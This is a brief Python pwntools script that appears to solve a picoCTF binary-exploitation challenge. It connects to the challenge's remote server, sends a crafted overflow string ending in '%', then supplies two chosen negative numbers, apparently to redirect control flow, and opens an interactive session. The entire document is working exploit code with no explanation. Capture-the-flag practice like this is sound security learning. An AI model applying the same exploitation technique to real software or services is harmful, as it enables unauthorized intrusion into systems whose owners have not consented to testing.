from pwn import *

# io = process('./vuln')
io = remote('saturn.picoctf.net', 54514)

io.sendlineafter(b'Tell me a story and then I\'ll tell you if you\'re a 1337 >> ', b'A' * 20 + b'%')

io.sendlineafter(b'On a totally unrelated note, give me two numbers. Keep the first one less than 10.', b'-16 -314\n')

io.interactive()